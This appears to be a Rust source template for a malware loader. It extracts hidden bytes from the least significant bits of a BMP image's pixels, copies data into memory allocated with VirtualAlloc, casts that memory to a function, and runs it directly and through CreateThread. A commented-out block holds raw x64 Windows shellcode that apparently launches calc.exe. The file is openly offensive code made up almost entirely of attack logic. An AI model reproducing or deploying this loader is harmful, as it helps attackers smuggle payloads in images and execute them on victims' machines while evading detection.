use std::mem;
use std::ptr;

use image::{GenericImageView, RgbImage};
use image::io::Reader as ImageReader;

use winapi::um::winnt;
use winapi::ctypes::c_void;
use winapi::shared::basetsd::SIZE_T;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;


fn run(data: Vec<u8>) {
    unsafe {
        let size: SIZE_T = {{ MAX_BITS }} / 8;
        // let addr: *mut u8;

        // Take a pointer
        let raw_addr: *mut c_void;

        // Allocate aligned to page size
        raw_addr = VirtualAlloc(
            ptr::null_mut(),
            size,
            winnt::MEM_RESERVE | winnt::MEM_COMMIT,
            winnt::PAGE_READWRITE
        );

        if raw_addr == 0 as *mut c_void {
            panic!("Couldn't allocate memory.");
        }
        // let map = MemoryMap::new(data.len(), &[MapReadable, MapWritable, MapExecutable]).unwrap();
        // std::ptr::copy(data.as_ptr(), map.data(), data.len());
        // let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.data());
        // exec_shellcode();

        // NOTE no FillMemory() or SecureZeroMemory() in the kernel32 crate

        // Transmute the c_void pointer to a Rust u8 pointer
        let addr: *mut u8 = mem::transmute(raw_addr);
        std::ptr::copy(data.as_ptr(), addr, size);

        // let exec_shellcode: extern "C" fn() -> ! = mem::transmute(raw_addr);
        // exec_shellcode();
        let exec_shellcode: extern "system" fn(*mut c_void) -> u32 = mem::transmute(raw_addr);
        exec_shellcode(0 as *mut c_void);
        CreateThread(
            0 as *mut SECURITY_ATTRIBUTES,  // lpThreadAttributes: LPSECURITY_ATTRIBUTES, 
            0,  // dwStackSize: SIZE_T, 
            Some(exec_shellcode),  // lpStartAddress: LPTHREAD_START_ROUTINE, 
            0 as *mut c_void, // lpParameter: LPVOID, 
            0u32,  // dwCreationFlags: DWORD,
            0 as *mut u32  // lpThreadId: LPDWORD
        );
    }
}


fn get_lsb(target: u8, source: u8) -> u8 {
    (target << 1) | (source & 1)
}


fn main() {
    // let data: Vec<u8> = vec![252u8, 72, 131, 228, 240, 232, 192, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 
    // 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 
    // 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 
    // 208, 139, 128, 136, 0, 0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 
    // 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 
    // 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 
    // 28, 73, 1, 208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 
    // 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 87, 255, 255, 255, 93, 72, 186, 1, 0, 0, 0, 0, 0, 0, 0, 72, 141, 141, 1, 
    // 1, 0, 0, 65, 186, 49, 139, 111, 135, 255, 213, 187, 240, 181, 162, 86, 65, 186, 166, 149, 189, 157, 255, 213, 72, 131, 196, 
    // 40, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 89, 65, 137, 218, 255, 213, 99, 97, 108, 99, 46, 
    // 101, 120, 101, 0];

    const shellcode_size: usize = 144;
    

    // let img = image::open("../../../samples/Untitled2.bmp").unwrap().into_rgb8();
    let img = image::open("../../../samples/Untitled2.bmp").unwrap();
    let (width, height) = img.dimensions();

    let mut data: [u8; shellcode_size / 8] = [0; shellcode_size / 8];

    let mut pos = 0;
    let mut length = shellcode_size;
    for y in (0..height).rev() {
    for x in 0..width {
        let pixel = img.get_pixel(x, y);
        let image::Rgba(rgba) = pixel;
        print!("{:?}\n", rgba);
        let [R, G, B, _A] = rgba;

        for byte in &[R, G, B] {
            // print!("{:?}\n", byte);
            if length <= 0 {
                print!("{:?}\n", data);
                return
            }

            data[pos / 8] = get_lsb(data[pos / 8], *byte);
            print!("{:?}, ", data[pos / 8]);
            length -= 1;
            pos += 1;
        }
    }
    }
}
